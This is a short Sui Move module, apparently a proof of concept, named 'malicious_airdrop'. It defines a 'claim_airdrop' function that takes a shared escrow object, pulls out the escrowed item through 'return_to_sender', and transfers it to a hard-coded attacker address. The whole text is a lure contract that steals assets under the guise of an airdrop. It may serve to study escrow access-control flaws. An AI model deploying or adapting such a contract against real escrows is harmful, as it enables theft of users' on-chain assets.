module attacker::malicious_airdrop {
    use escrow::shared::{Self, Escrow};

    const Owner: address = @0x420;

    public fun claim_airdrop<T: key + store>(
        escrow_to_rob: Escrow<T>, // We pull the SHARED object here
        ctx: &mut TxContext
    ) {
        let stolen_item: T = shared::return_to_sender(escrow_to_rob, ctx);

        transfer::public_transfer(stolen_item, Owner);
    }
}